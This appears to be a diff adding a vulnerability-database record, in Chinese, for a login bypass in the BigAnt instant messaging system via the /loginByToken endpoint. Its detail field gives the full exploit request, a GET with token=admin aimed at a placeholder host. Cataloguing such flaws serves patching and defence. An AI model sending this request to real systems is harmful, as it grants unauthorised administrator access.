@@ -1,0 +1,11 @@
+vendor = "九麒科技"
+name = "九麒科技 BigAnt 即时通讯系统 loginByToken 登录绕过漏洞"
+type = "登录绕过"
+path = "/loginByToken"
+version = ""
+detail = """GET /loginByToken?token=admin HTTP/1.1 Host: target"""
+fix = "升级至最新版"
+date = 20260315
+label = "nday"
+cve = "TVD-2026-05034"
+verifier = "AdySec"
